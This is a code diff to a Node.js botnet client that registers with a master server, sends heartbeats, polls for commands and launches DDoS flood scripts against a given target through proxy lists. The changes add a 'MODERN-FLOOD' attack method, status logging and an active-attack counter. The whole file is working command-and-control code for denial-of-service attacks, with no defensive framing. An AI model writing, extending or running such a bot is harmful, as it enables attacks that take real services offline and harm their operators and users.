@@ -28,6 +28,7 @@ async function fetchData() {
     console.log('========================================');
     console.log(`🎯 Master Server: ${MASTER_SERVER}`);
     console.log(`🔄 Auto-registration: ENABLED`);
+    console.log(`💓 Heartbeat: Every 30 seconds`);
     console.log('========================================\n');
     
     return data;
@@ -72,6 +73,7 @@ async function autoRegister() {
       console.log(`[SUCCESS] ✅ Auto-approved by master server!`);
       console.log(`[INFO] Bot registered at: ${myBotUrl}`);
       console.log(`[INFO] Ready to receive attack commands!`);
+      console.log(`[INFO] Status: 🟢 ONLINE\n`);
       
       // Send heartbeat every 30 seconds to stay connected
       setInterval(() => {
@@ -89,6 +91,7 @@ async function autoRegister() {
       console.log(`Bot URL: ${myBotUrl}`);
       console.log(`Reason: Server administrator blocked this bot`);
       console.log(`\nContact server admin to unblock this bot.`);
+      console.log(`Server: ${MASTER_SERVER}`);
       console.log(`========================================\n`);
       isBlocked = true;
       process.exit(0); // Exit the bot
@@ -109,10 +112,13 @@ async function autoRegister() {
 async function sendHeartbeat() {
   try {
     await axios.get(`${MASTER_SERVER}/ping`, { timeout: 5000 });
+    console.log(`[HEARTBEAT] 💓 Sent to master | Status: 🟢 ONLINE`);
+    
     // Also check for pending commands
     checkForCommands();
   } catch (error) {
-    console.log(`[WARN] Heartbeat failed, re-registering...`);
+    console.log(`[WARN] Heartbeat failed | Status: 🔴 OFFLINE`);
+    console.log(`[INFO] Re-registering with master...`);
     registrationAttempts = 0;
     autoRegister();
   }
@@ -130,11 +136,11 @@ async function checkForCommands() {
       const command = response.data.command;
       
       if (command.action === 'stop') {
-        console.log(`\n[STOP-RECEIVED] Stopping all attacks`);
+        console.log(`\n[STOP-RECEIVED] 🛑 Stopping all attacks`);
         stopAllAttacks();
       } else if (command.action === 'attack') {
         const { target, time, methods } = command;
-        console.log(`\n[COMMAND-RECEIVED] ${methods} -> ${target} for ${time}s`);
+        console.log(`\n[COMMAND-RECEIVED] 🚀 ${methods} -> ${target} for ${time}s`);
         executeAttack(target, time, methods);
       }
     }
@@ -150,14 +156,14 @@ function stopAllAttacks() {
   activeProcesses.forEach(proc => {
     try {
       process.kill(-proc.pid); // Kill process group
-      console.log(`[KILLED] Process ${proc.pid}`);
+      console.log(`[KILLED] ✓ Process ${proc.pid}`);
     } catch (error) {
       console.error(`[ERROR] Failed to kill process ${proc.pid}: ${error.message}`);
     }
   });
   
   activeProcesses = [];
-  console.log(`[STOP] All attacks stopped`);
+  console.log(`[STOP] ✅ All attacks stopped\n`);
 }
 
 // Execute attack methods
@@ -185,7 +191,11 @@ function executeAttack(target, time, methods) {
     }, parseInt(time) * 1000 + 5000); // Add 5s buffer
   };
 
-  if (methods === 'HTTP-SICARIO') {
+  if (methods === 'MODERN-FLOOD') {
+    console.log('✅ Executing MODERN-FLOOD');
+    execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64`);
+  }
+  else if (methods === 'HTTP-SICARIO') {
     console.log('✅ Executing HTTP-SICARIO');
     execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
     execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
@@ -228,6 +238,9 @@ function executeAttack(target, time, methods) {
     execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
     execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
   }
+  else {
+    console.log(`❌ Unknown method: ${methods}`);
+  }
 }
 
 // Health check endpoint
@@ -237,7 +250,8 @@ app.get('/health', (req, res) => {
     timestamp: Date.now(),
     master: MASTER_SERVER,
     bot: 'ready',
-    uptime: process.uptime()
+    uptime: process.uptime(),
+    activeAttacks: activeProcesses.length
   });
 });
 
@@ -246,7 +260,8 @@ app.get('/ping', (req, res) => {
   res.json({ 
     alive: true,
     uptime: process.uptime(),
-    timestamp: Date.now()
+    timestamp: Date.now(),
+    status: 'online'
   });
 });
 
